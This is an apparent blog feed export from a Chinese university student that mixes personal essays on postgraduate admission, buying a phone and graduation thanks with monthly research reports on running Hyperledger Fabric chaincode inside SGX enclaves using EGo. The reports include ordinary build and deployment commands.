<p>&emsp;&emsp;2021年9月28日，我终于拿到了武汉大学的待录取通知，这一天将成为我人生中最重要的转折点。<br><img src="/2021/09/29/%E4%BF%9D%E7%A0%94%E7%BB%93%E6%9D%9F%E6%9C%89%E6%84%9F/offer.jpg" alt="offer"></p>
<p>&emsp;&emsp;保研的过程和考研复习的痛苦程度不相上下。对于我来说只是持续了一整年，对于别人可能从大一入学就开始了。大一大二我活在自己的舒适圈中，每天除了日常课程任务就是自娱自乐，偶尔去看看电影跑跑步，生活完全与他人隔离，这给我带来了无限的快乐，但也让我错失了许多交友的机会。我的室友凭借着才华与智慧，走进了各种社团，与辅导员交友，获取各种竞赛信息，而我只会在竞赛结束时感叹：“啊？还有这个比赛啊？”因此周围的同学在各种评奖评优中斩获佳绩，我只能默默悔恨。</p>
<p>&emsp;&emsp;大三时，我终于认识到自己的懒散与差距，这才迈出第一步，参加了湖北省英语翻译大赛，虽然什么奖也没捞到，但却是宝贵的一次经历。后续也参加了一些微不足道的比赛，获得一些小奖，自己也挺开心。之后就是美赛，也算是我参加过最有价值的比赛了。接着就没有参加比赛了，我深知自己得不了奖，参加这些只会是耗费时间和精力，因此便抱着侥幸心理，如果保研不成功还能考嘛，万一保上了呢？万一、万一······</p>
<p>&emsp;&emsp;六月份大三学年结束时，夏令营开始了，这是我绝不能放弃的机会，我毅然决然地报名了。夏令营是我人生中第一次参加面试，我紧张极了，面试流程根本不熟悉，听别人说进去要用英语自我介绍，我一直背啊背，回想着各种可能问到的问题，在心中暗示自己沉着冷静。进入面试室，刚说了一句：“hello, everyone, my name is…”我就被面试官打断了，他笑着说：“我们问一个你再回答，看来这位同学有点激动啊。”我只能尴尬地笑笑，让自己的慌张不被看出。之后的问题就比较简单了，面试官问的都是简历上写的内容，因此我能娓娓道来。最后，我也顺利成为了优秀营员。</p>
<p>&emsp;&emsp;真正的转折点就是这次夏令营了，在夏令营闭营仪式上，老师让我们赶紧联系心仪的导师，抓住机会。我想都没想就去给一位老师发了邮件，没想到就是这封邮件改变了一切。王老师直接邀请我加入实验室，我欣喜若狂，连忙答应，第二天就参与到实验室科研工作中了，虽说只是协助一个留学生，能被导师接纳已足够让我满足。但那时我还不能确定有保研资格，如果最后保研失败，我就必须退出实验室去复习考研了，这对于导师、学长学姐都是一个极其不负责任的表现。过了几天我变得悔恨和害怕，如果自己能更深思熟虑一些，就不会把自己送上绝路了。2021年的暑假，我留校了，留校读论文、做实验，牺牲着自己的假期，做着更有意义的事情。</p>
<p>&emsp;&emsp;9月份大四开学，保研申请表开始提交。我害怕自己保研失败，提前买好了考研数学英语复习资料，边复习边等待。我唯一拿得出手的就是成绩，其余加分项均为0。提交之后我寝食难安，每天都忧心忡忡，尤其是出结果那一个晚上，我紧张地难以呼吸。我怀着忐忑的心情，一步步走到结果公示处，在一堆名字中发现了自己，我心中的石头终于放下了，这次又是开心地无法呼吸。我是幸运的，幸运的是填报了网络安全学院，幸运的是学院保研名额很多，幸运的是我的成绩没有很差……</p>
<p><img src="/2021/09/29/%E4%BF%9D%E7%A0%94%E7%BB%93%E6%9D%9F%E6%9C%89%E6%84%9F/books.jpg" alt="吃灰的考研书籍"></p>
<center style="font-size:16px;color:#000000f;text-decoration:underline">吃灰的考研书籍</center> 

<p>&emsp;&emsp;之后就是志愿填报了，此时也不再紧张，获得优秀营员的我拿到录取也是尘埃落定，但拿到录取通知，尤其是与家人朋友分享这一消息，让我感到无与伦比的放松，是啊，一切终于结束了，开心的是不用考研了，不开心的是考研资料花了我200块，白买了，哈哈。</p>
<p>&emsp;&emsp;从现在开始就可以认认真真踏踏实实做项目了，也没有其他顾虑，也算是提前进入研究生生涯了吧，希望自己能在科研上有所成就，将来说不定还可以读博呢。</p>]]></content>
      <categories>
        <category>生活吐槽</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>科研周报说明</title>
    <url>/2021/11/12/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A5%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[<!-- excerpt -->
<!-- toc -->
<p>之前做的区块链工作已经发表了，虽然遇到了种种磨难，但也算是好事吧，所以将之前的科研周报陆陆续续放上来。因为一直很忙，所以会更新地很慢，将word一个个转化为markdown也挺麻烦的，业余时间就慢慢放上来吧。科研周报按照当时写的日期上传，所以不在最新的文章列表，需要往前翻一翻。</p>
<p>现在已经换到神经网络隐私保护方向了，不再是孤身一人，而是成为一个小组，做了一些成果，挺开心的。因为这个工作是一个连续的过程，也不太好将科研周报放上来，担心泄密（虽然没有多少人看这个博客）。希望以后能在该方向多做一些成果吧。</p>
<p>最后附上区块链工作发表的论文链接与PDF。虽然只是一个中文核心，但也算自己的心血了。</p>
<p>论文知网链接：<a href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2022&amp;filename=XXAQ202207009&amp;uniplatform=NZKPT&amp;v=IzPIW9wyo3h7oRjmsS4mn-pIDmP4wAHdNVoeELxZSNn0Zcc5iSXXOI3td7yC7m_a">一种基于SGX的轻量Fabric链码可信执行环境构建方法</a></p>
<p>PDF文件：<a href="一种基于SGX的轻量Fabric链码可信执行环境构建方法.pdf">一种基于SGX的轻量Fabric链码可信执行环境构建方法</a></p>
<p>参与的神经网络工作在学院官网展示：<a href="http://cse.whu.edu.cn/info/1100/3867.htm">我院科研论文被国际人工智能顶级会议NeurIPS录用</a></p>]]></content>
  </entry>
  <entry>
    <title>换新手机有感</title>
    <url>/2022/03/12/%E6%8D%A2%E6%96%B0%E6%89%8B%E6%9C%BA%E6%9C%89%E6%84%9F/</url>
    <content><![CDATA[<!-- excerpt -->
<p>&emsp;&emsp;我的第一台手机是老人机，大概是初中时使用的，初中在镇上上学，每次就把手机藏在包里，等到一周放学后打开与家里通信。再后来，我妈在地摊上以1000块的价格买了两个盗版苹果手机，一个仿iPhone 4一个仿iPhone 4s，都是安卓系统。白色的4s还不错，可以看视频玩游戏，也是我第一个智能手机了。</p>
<p>&emsp;&emsp;高中一直都没有新手机，本来就都在学校，一个月放假一两天，4s已经可以满足基本需求。那时，每次放假我都会用手机看动漫，如东京喰种、寄生兽、刀剑神域等，现在有些已经被封杀了。胆小的我就爱看这种刺激的，看完一整晚不敢睡觉，也是一段奇妙的经历了。</p>
<p>&emsp;&emsp;2018年高中结束迈入大学，在我的要求下，家里终于给我买了一台iPhone 8，高考完当晚就买了，是我姐付的钱，忘记爸爸有没有再把钱转给姐姐。iPhone 8非常好用，打游戏看视频便成为我假期的乐趣所在，那时还非常喜欢玩王者荣耀，虽然因为未成年约束，每天只能玩两个小时，也足够了。</p>
<p>&emsp;&emsp;不幸的是，在2019年8月左右，在去我姐夫家的路上手机被夹坏了。在车上，我妈突然给我姐打了电话，聊了一会又把手机给我，所以为了拿我姐的手机，我的手机就放在膝盖上了。等到下车就忘了这一回事，手机掉在车上，一关门刚好夹到手机，整个手机都夹弯了，无法再使用。手机坏了，伤心在所难免，但这都还是小事。电话那头，我妈知道了这件事，对我大骂，说不应该给我买这么贵的手机，我不配用，到头来还这么粗心搞坏了，也没用多长时间，就应该买一个便宜的。听到这些，我开始痛哭，不是因为手机坏了很伤心，而是自尊受到了伤害，自己太弱小了，没有钱不能独立，手机坏了都没有能力自己买，反而只能依靠父母，依靠他们购买的东西只会成为他们的把柄，永远束缚着我。好在我姐对我真的很好，那时她工资也不高，也没有存款，还是给我买了新的iPhone XR，给了我很多安慰。从此我下定决心，一定要努力攒钱，早日实现财富自由。</p>
<p>&emsp;&emsp;之后到没出什么大事，我用手机非常小心，怕再次出现这种情况。不过有一次和同学玩王者荣耀，突然手机就充不上电了，换插头换充电线都不行。最后我才意识到可能是手机内部烧坏了，很是担心，我怕又要买新手机，那时我的存款就只有3000左右，我去店铺里面看勉强可以买一个iPhone SE，最坏的情况可以自己花钱再买一个，不用被骂。但我姐和姐夫都觉得是小事，拿去维修一下就好了。我选了上门维修，花了700块，最后也修好了。那时还是太笨了，在手机上选了主板维修，最后也没怎么换主板啥的，如果自己拿去店里面可能花不到几百块。</p>
<p>&emsp;&emsp;这台iPhone XR一直陪伴到2022年，大学快毕业了。我依靠着学校补助、导师工资、奖学金和每个月的生活费攒下不少钱，可以自费买手机和MacBook了，算是感受到了一点点独立的快乐。所以在38妇女节大促之际，我比较了各种价格，最后下单了这台iPhone 13 Pro，花了8399，旧的iPhone XR也回收了1200，整体下来还算不错。这次经历还算难忘，因为花自己的钱没有任何包袱，可以不用被骂不用遭受道德压力，在此记录下来。</p>]]></content>
      <categories>
        <category>生活吐槽</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>本科毕业致谢</title>
    <url>/2022/04/27/%E6%9C%AC%E7%A7%91%E6%AF%95%E4%B8%9A%E8%87%B4%E8%B0%A2/</url>
    <content><![CDATA[<!-- excerpt -->
<p>&emsp;&emsp;时光飞逝，大学四年已接近尾声。想起刚入学那会，自己还青春懵懂，没有目标，只是将学习作为一种任务，只顾成绩而放弃了社交，那会是我成绩最好的时候，也是最遗憾的时候；而如今，自己已经在实验室工作学习了一年，获得了学习之外的许多东西，收获了友情，走出了自己的舒适圈，可以说这是我最精彩的一年。</p>
<p>&emsp;&emsp;首先，我非常感谢自己。获得保研资格、在实验室努力学习工作，这都是我一步一步争取而来的。感谢前两年努力学习的自己，为保研奠基；感谢后两年拼命竞赛、工作学习的自己，为研究生学习铺路。虽然我才大四毕业，但这一年宛如研究生的第一年，收获很多。</p>
<p>&emsp;&emsp;感谢我的父母，感谢他们二十几年的辛苦栽培，尽可能让我衣食无忧、专心学习。</p>
<p>&emsp;&emsp;感谢我的导师王鹃老师。在整个大四一年中，王老师给了我悉心的指导，帮助我解决生活、学习中的各种问题，为我提供了最好的学习环境。</p>
<p>&emsp;&emsp;感谢我的姐姐姐夫，在我压力如山、最困难最黑暗的时候，是他们倾听了我的每一份抱怨，是他们给我指明方向，给了我学习、坚持下去的希望和动力。感谢我的哥哥，日夜陪伴在我身边，给我生活的寄托与鼓舞，为我排忧解难，因为有你，我不再孤独。</p>
<p>&emsp;&emsp;感谢AI小组的每一个人，杨梦达学长、徐枭洋学长、李子昂。这半年来我们一起学习进步，一起娱乐生活，一起面对苦难的工作。因为有你们，我才能不断进步，才会更加热爱生活。</p>
<p>&emsp;&emsp;感谢A402实验室的每一位学长学姐，感谢你们的生活与学习上的陪伴，感谢这个大家庭，和大家在一起真的很快乐。</p>
<p>&emsp;&emsp;感谢我的室友杨孝彬。感谢你容忍我每天严格的作息时间，容忍我起得早睡得早，谢谢你为了我午休而果断关闭游戏，谢谢你包容我的各种缺点。感谢这四年的同寝生活，有你的陪伴，这四年永生难忘。</p>]]></content>
      <categories>
        <category>生活吐槽</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>2021年10月科研月报</title>
    <url>/2021/11/02/2021%E5%B9%B410%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/</url>
    <content><![CDATA[<!-- excerpt --><br><!-- toc --></p>
<h1 id="本学期科研规划"><a href="#本学期科研规划" class="headerlink" title="本学期科研规划"></a>本学期科研规划</h1><p>&emsp;&emsp;本学期的科研项目为使用SGX保护hyperledger-fabric区块链，目前已经成功部署fabric网络和SGX，对二者进行测试使用，并对fabric代码和SGX代码进行部分分析。<br>&emsp;&emsp;计划十月份-十一月份能够初步结合fabric和sgx，完成简单的chaincode（智能合约）保护。<br>&emsp;&emsp;在上述计划完成后，分析多种针对fabric的攻击方式，改进以上方案，抵御至少一种攻击行为。</p>
<h1 id="第一周-2021-10-08-–-2021-10-15"><a href="#第一周-2021-10-08-–-2021-10-15" class="headerlink" title="第一周 2021/10/08 – 2021/10/15"></a>第一周 2021/10/08 – 2021/10/15</h1><h2 id="本周工作情况和进展"><a href="#本周工作情况和进展" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><p>&emsp;&emsp;本周工作主要是阅读源码，包括ego、fabric的源码，理解编写细节。</p>
<ol>
<li>SGX文件分析<br>&emsp;&emsp;SGX最重要的几个文件：<br>&emsp;&emsp;EDL（Enclave Description Language）文件：声明可信函数和不可信函数，非可信区只能通过 ECALL 函数调用可信区内的函数。可信区只能通过 OCALL 函数调用非可信区的函数。<br><div align="center"><img src="/2021/11/02/2021%E5%B9%B410%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/1.png"></div><br>&emsp;&emsp;xml文件：enclave的配置文件，如堆栈大小、线程数、是否可debug。<br><div align="center"><img src="/2021/11/02/2021%E5%B9%B410%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/2.png"></div><br>&emsp;&emsp;sgx几个重要的工具（可执行文件，安装sgx时自动编译生成）：<br>&emsp;&emsp;sgx_edger8r：根据edl文件生成可信和不可信代码（c文件和头文件）<br>&emsp;&emsp;sgx_sign：为enclaves签名<br><br>&emsp;&emsp;除以上文件之外，在编写sgx程序时要将可信部分、不可信部分分开编写和编译，最后链接可信库和不可信库，然后链接成可执行文件。sgx程序的makefile往往很复杂，包括各种链接过程，因此是一个阅读难点。<br><br></li>
<li><p>EGO源码分析<br>&emsp;&emsp;ego是edgeless system下的一个项目，edgeless system（<a href="https://www.edgeless.systems/">https://www.edgeless.systems/</a>）下都是可信计算相关的软件，如ego、edgelessDB、MarbleRun，以及edgeless RT（一个可信运行环境sdk）。<br>&emsp;&emsp;分析ego源码：<br>&emsp;&emsp;ego最重要的两个命令ego sign（为可执行文件签名）、ego run（为可执行文件创建enclave并运行）<br><br>&emsp;&emsp;ego sign + {exe可执行文件；json enclave配置文件；空} 三种类型文件<br>&emsp;&emsp;sign + exe 直接为可执行文件签名，首先会生成默认的json文件（enclave配置文件，和sgx的xml文件作用一致），然后生成公私密钥对，使用私钥进行签名。<br>&emsp;&emsp;sign + json或空<br>&emsp;&emsp;-&gt;调用readConfigJSONtoStruct -&gt;调用unmarshal反序列化json字符串，调用Validate检验json文件数据，PopulateContent加密<br>&emsp;&emsp;-&gt;调用signWithJSON 读取json文件 -&gt; 调用embedConfigAsPayload，将json文件嵌入exe文件中-&gt;调用createDefaultKeypair创建公私密钥对<br>&emsp;&emsp;-&gt;调用ego-oesign（原型openenclave的oesign）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">oesign sign -e ego-enclave -c enclave.conf -k private.pem --payload helloworld</span><br><span class="line">  -e, --enclave-image  path of an enclave image file.</span><br><span class="line">  -c, --config-file   [optional] configuration file specifying the enclave properties.</span><br><span class="line">  -k, --key-file    path to a private key file in PEM format to sign enclave image with</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;ego run 运行某一个特定的可执行文件<br>&emsp;&emsp;run + filename<br>&emsp;&emsp;使用ego-host（原型edgerless RT的erthost）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">erthost ego/share/ego-enclave:helloworld</span><br><span class="line"></span><br><span class="line">  Usage: ./ego-host enclave_image_path [enclave args...]</span><br><span class="line">  Set OE_SIMULATION=1 for simulation mode.</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;Erthost是一个用于运行飞地的工具。在开发期间，将飞地与ertdeventry连接起来。然后erthost将透明地将所有命令行参数和环境变量转发给enclave应用程序。飞地可以无限制地访问主机的文件系统<br>&emsp;&emsp;以上的可执行程序必须通过ertgo编译，不然无法生成enclave。<br>&emsp;&emsp;ertgo是一个经过改进的Go编译器，可以从给定的Go项目中构建与enclave兼容的可执行文件——同时提供与原始Go编译器相同的CLI。<br>&emsp;&emsp;ego和edgeless RT都是依靠openenclave sdk（<a href="https://github.com/openenclave/openenclave">https://github.com/openenclave/openenclave</a>），openenclave和sgx类似，也是有对应的工具oeedger8r、oesign，和sgx的sgx_edger8r、sgx_sign一致：<br><div align="center"><img src="/2021/11/02/2021%E5%B9%B410%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/3.png"></div><br>&emsp;&emsp;ego sign本质就是调用oesign，而ego run是调用edgeless RT的erthost，erthost是在openenclave基础上开发而来，为可执行程序创建运行时的enclave。erthost还未分析。<br><br></p>
</li>
<li>fabric源码分析<br>&emsp;&emsp;fabric安装和调用chaincode（智能合约）的命令如下：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">peer lifecycle chaincode package mycc.tar.gz --path github.com/hyperledger/multiple-deployment/abstore --lang golang --label mycc</span><br><span class="line">//chaincode打包，打包结果为压缩文件，包含一个json文件（chaincode路径、语言、标签）和源码go文件</span><br><span class="line">peer lifecycle chaincode install mycc.tar.gz  //将chaincode安装到节点上</span><br><span class="line">peer chaincode invoke -c &#x27;&#123;&quot;Args&quot;:[&quot;Init&quot;,&quot;a&quot;,&quot;100&quot;,&quot;b&quot;,&quot;100&quot;]&#125;&#x27;  //调用Init初始化</span><br><span class="line">peer chaincode query -C mychannel -n mycc -c &#x27;&#123;&quot;Args&quot;:[&quot;query&quot;,&quot;a&quot;]&#125;&#x27; </span><br><span class="line">//调用query查询</span><br></pre></td></tr></table></figure>
&emsp;&emsp;初步分析了fabric相关的代码，安装chaincode时会根据语言类型创建dockerfile，并进行编译，在调用chaincode时也会先构建容器，将chaincode放入容器中运行，因此这部分需要着重理解并改进，目前还在分析中。</li>
</ol>
<h2 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h2><p>&emsp;&emsp;源码还未了解透彻，需要时间阅读。<br>&emsp;&emsp;ego可以直接为单独的go程序创建enclave，使整个程序在enclave中安全运行。而chaincode不是独立运行的程序，需要与peer节点进行交互，也就是存在一些函数调用，调用部分需要单独放入enclave中，因此无法直接将ego嵌入fabric中使用。<br>&emsp;&emsp;fabric对chaincode的载入、编译、容器构建都是集成在peer命令中，因此需要单独将该部分拿出重新分析和编写，并集成ertgo（改良的go编译器）和ego的功能。<br>&emsp;&emsp;fabric源码调用过程繁杂，分析过程比较耗时。</p>
<h2 id="下周工作计划"><a href="#下周工作计划" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><p>&emsp;&emsp;继续阅读源码，剖解fabric的peer命令，需要深入了解chaincode如何安装、怎么在内部编译和交互的。分析ego中erthost的原理，erthost直接为可执行程序创建enclave，需要将该功能改进成peer与chaincode交互时启动enclave。</p>
<h2 id="个人反思"><a href="#个人反思" class="headerlink" title="个人反思"></a>个人反思</h2><p>&emsp;&emsp;项目目前还处于分析阶段，需要分析很多代码，ego、fabric、edgeless RT等，很花时间，尤其是fabric，工程量比较大，调用关系复杂。理解原理是一回事，分析代码就是另一回事了。<br>&emsp;&emsp;因此现在还理解不透彻，没有什么好的实践想法，进度较慢。<br>&emsp;&emsp;下一步规划是优先分析代码，理解代码编写过程后再上手改进。</p>
<p>&emsp;&emsp;ps:以下想法未提交给老师看，个人吐槽。<br>&emsp;&emsp;整个实验都是留学生的毕业项目，我只是一个帮手，但是大部分都是我一个人做的，留学生来实验室的时间很少，经常就来几个小时，每天只看看原理，代码相关的实操根本不会。留学生学习能力很差，而且并不勤奋，对实验的付出不超过20%，而我却要累死累活地帮他做，每天要分析源码，思考解决方案，汇报做ppt。最后如果论文写出来了（虽然我觉得只靠我一个人做不出来），第一作者还是他的名字，我只能拿一个共同一作，因为他只有一作才能毕业。<br>&emsp;&emsp;唉，现在生活就很苦，我才来了两个半月，就要马上赶着发论文，现在时间紧迫，项目难度大，没有学长带，一个人孤军奋战，很是苦涩。</p>
<h1 id="第二周-2021-10-18-–-2021-10-24"><a href="#第二周-2021-10-18-–-2021-10-24" class="headerlink" title="第二周 2021/10/18 – 2021/10/24"></a>第二周 2021/10/18 – 2021/10/24</h1><h2 id="本周工作情况和进展-1"><a href="#本周工作情况和进展-1" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><p>&emsp;&emsp;本周其他事情较多，并且在为新电脑配环境，因此没有什么新的进展。电脑的芯片支持sgx，但是主板不支持，因此在想办法和其他学长调换主板。<br>&emsp;&emsp;在分析ego和fabric时，突然有一个想法，将整个peer执行都放入ego的enclave中。因为上周分析过，ego只能为完整独立的可执行程序创建enclave，直接为chaincode这种需要交互的无法创建。而peer命令会与chaincode交互，也就是说peer运行过程是一个完整独立的过程，因此可以尝试使用ego run peer……来为整个peer运行创建enclave。虽然该方法并不是一个好的解决方案，但可以尝试一下。<br>&emsp;&emsp;首先需要使用改良的编译器ertgo来编译出peer可执行程序，然后用ego sign 为peer签名，使用ego run运行：</p>
<p><div align="center"><img src="/2021/11/02/2021%E5%B9%B410%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/4.png"></div><br>&emsp;&emsp;由上图单独使用ego run peer是可以正常运行的，但在实际的fabric网络中：</p>
<p><div align="center"><img src="/2021/11/02/2021%E5%B9%B410%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/5.png"></div><br>&emsp;&emsp;使用ego run peer来调用invoke，初始化ledger数据，但出错了，显示core文件找不到，core文件是fabric的配置文件，路径已经设置好了，找不到原因可能是enclave与外界隔离了，无法读取core文件。</p>
<h2 id="存在的问题-1"><a href="#存在的问题-1" class="headerlink" title="存在的问题"></a>存在的问题</h2><p>&emsp;&emsp;目前项目还处于分析阶段，ego的原理还未解析清楚，因此工作进度过慢。</p>
<h2 id="下周工作计划-1"><a href="#下周工作计划-1" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><p>&emsp;&emsp;抽时间在新电脑上配置fabric和sgx的硬件运行环境<br>&emsp;&emsp;完成chaincode的enclave运行或者peer的enclave运行。</p>
<h1 id="第三周-2021-10-25-–-2021-10-31"><a href="#第三周-2021-10-25-–-2021-10-31" class="headerlink" title="第三周 2021/10/25 – 2021/10/31"></a>第三周 2021/10/25 – 2021/10/31</h1><h2 id="本周工作情况和进展-2"><a href="#本周工作情况和进展-2" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><p>&emsp;&emsp;本周在分析ego和fabric的工作原理后，发现了之前工作的误区。之前认为fabric的链码是需要交互的，无法单独使用ego运行。实际过程更为复杂，虽然结果看上去是peer调用了chaincode的函数，但实际上chaincode是一个独立的程序，它启动后会自动注册到peer上，建立gRPC链接来通信，然后peer调用chaincode中的函数功能，所以chaincode还是先自主启动，启动gRPC服务，再开始交互，这就说明可以使用ego run运行chaincode。<br>&emsp;&emsp;peer在安装链码时，会将整个链码包（tar.gz包，包含源代码.go和设置文件.json）复制到peer容器中，然后在初始化链码时，首先使用镜像fabric-ccenv来编译链码为可执行程序，然后使用镜像fabric-baseos来启动chaincode容器，运行链码，运行命令为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chaincode -peer.address=saturn:7052</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;因此只要在两个镜像中集成ego，更改编译和运行方式即可。<br>&emsp;&emsp;接下来需完成ego启动的三步：ego-go编译，ego sign签名，ego run运行。<br>&emsp;&emsp;要修改镜像创建文件，安装ego和ertgo编译器。<br>&emsp;&emsp;修改镜像中编译go代码的部分，改为ego-go编译<br>&emsp;&emsp;修改chaincode启动代码部分，先签名，后启动。</p>
<h2 id="存在的问题-2"><a href="#存在的问题-2" class="headerlink" title="存在的问题"></a>存在的问题</h2><p>&emsp;&emsp;目前没有什么问题，整个项目的问题就在于chaincode编译运行过程太过隐式，不在peer或者chaincode源码中设置，而是隐藏在镜像的代码中，很难去发现分析，因此查阅了很多资料，耗费时间。</p>
<h2 id="下周工作计划-2"><a href="#下周工作计划-2" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><p>&emsp;&emsp;实现在镜像中集成ego和ertgo编译器，修改镜像中编译和启动的代码，更改为ego-go编译，ego sign签名，ego run运行即可。<br>&emsp;&emsp;预计下周可以完成。</p>]]></content>
      <categories>
        <category>科研周报</category>
      </categories>
      <tags>
        <tag>Hyperledger Fabric</tag>
        <tag>SGX</tag>
        <tag>EGo</tag>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>2021年11月科研月报</title>
    <url>/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/</url>
    <content><![CDATA[<!-- excerpt -->
<!-- toc -->
<h1 id="本学期科研规划"><a href="#本学期科研规划" class="headerlink" title="本学期科研规划"></a>本学期科研规划</h1><p>&emsp;&emsp;在fabric区块链中使用sgx技术，将chaincode放入enclave中运行，保护智能合约运行安全。</p>
<h1 id="第一周-2021-11-01-–-2021-11-07"><a href="#第一周-2021-11-01-–-2021-11-07" class="headerlink" title="第一周 2021/11/01 – 2021/11/07"></a>第一周 2021/11/01 – 2021/11/07</h1><h2 id="本周工作情况和进展"><a href="#本周工作情况和进展" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><p>&emsp;&emsp;本周在上周的基础上，实现ego启动chaincode，让chaincode在enclave中运行。</p>
<ol>
<li><p>Fabric链码关键命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">peer lifecycle chaincode package mycc.tar.gz --path abstore --lang golang --label mycc</span><br><span class="line">peer lifecycle chaincode install mycc.tar.gz</span><br><span class="line">peer lifecycle chaincode approveformyorg</span><br><span class="line">peer lifecycle chaincode commit</span><br><span class="line">peer chaincode invoke</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;fabric2.0使用lifecycle生命周期，命令和fabric1.0差距很大，下图为二者的区别：</p>
<div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/1.png"></div>
</li>
<li><p>链码打包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">peer lifecycle chaincode package mycc.tar.gz --path abstore --lang golang --label mycc</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;链码打包命令如上图，mycc.tar.gz是打包后的的压缩包，path指明链码路径，lang指明链码语言，lable即链码标签。压缩包内容如下：</p>
<p><div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/2.png" width="300" height="126"></div><br>  以go语言为例，压缩包中有code.tar.gz，就是go语言的源码，metadata.json记录链码的语言等信息，内容如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;path&quot;</span>:<span class="string">&quot;github.com/hyperledger/fabric-samples/chaincode/abstore&quot;</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;golang&quot;</span>,<span class="attr">&quot;label&quot;</span>:<span class="string">&quot;mycc&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>链码安装、编译、运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">peer lifecycle chaincode install mycc.tar.gz</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;上述命令会安装链码、编译并运行。安装过程会将链码包复制重命名，将mycc.tar.gz重命名，放入peer容器的/var/hyperledger/production/lifecycle/chaincodes路径下：</p>
<p><div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/3.png"></div><br>  编译过程首先使用第一个镜像，peer会运行hyperledger/fabric-ccenv:latest镜像，启动一个容器编译链码工程，编译后的可执行文件都命名为chaincode，编译脚本如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd chaincode/input/src</span><br><span class="line">GO111MODULE=on go build -v -mod=vendor -ldflags &quot;-linkmode external -extldflags &#x27;-static&#x27;&quot; -o chaincode/output/chaincode    github.com/archive/chaincode-go</span><br></pre></td></tr></table></figure>
<p>  因此需要在fabric-ccenv镜像中集成ego编译器，使用ego编译，使可执行程序适配enclave。<br>  然后使用第二个镜像，通过hyperledger/fabric-baseos:latest构建以dev开头的镜像，将可执行程序放入/usr/local/bin下<br>  Dockerfile如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> hyperledger/fabric-baseos:latest</span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> binpackage.tar /usr/<span class="built_in">local</span>/bin</span></span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> org.hyperledger.fabric.chaincode.type=<span class="string">&quot;GOLANG&quot;</span> \</span></span><br><span class="line"><span class="bash">org.hyperledger.fabric.version=<span class="string">&quot;latest&quot;</span></span></span><br><span class="line"><span class="keyword">ENV</span> CORE_CHAINCODE_BUILDLEVEL=latest</span><br></pre></td></tr></table></figure>
<p>  最后peer在dev镜像的基础上创建容器，设置环境变量，运行chaincode：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chaincode -peer.address=peer0.org1.example.com:7052</span><br></pre></td></tr></table></figure>
<p>  运行后链码会注册到peer上，并建立grpc通信，流程如下图：<br><div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/4.jpg" width="300" height="411"></div><br>  因此我将该运行指令进行扩展，先使用ego签名，再ego run运行chaincode。编写如下脚本：<br><div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/5.png" width="300" height="443"></div><br><div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/6.png" width="300" height="85"></div><br>  重要的一点是，由于enclave中的环境变量和文件与外界不通用，所以需要使用配置文件将密钥文件进行挂载，将环境变量传递到enclave中。</p>
</li>
</ol>
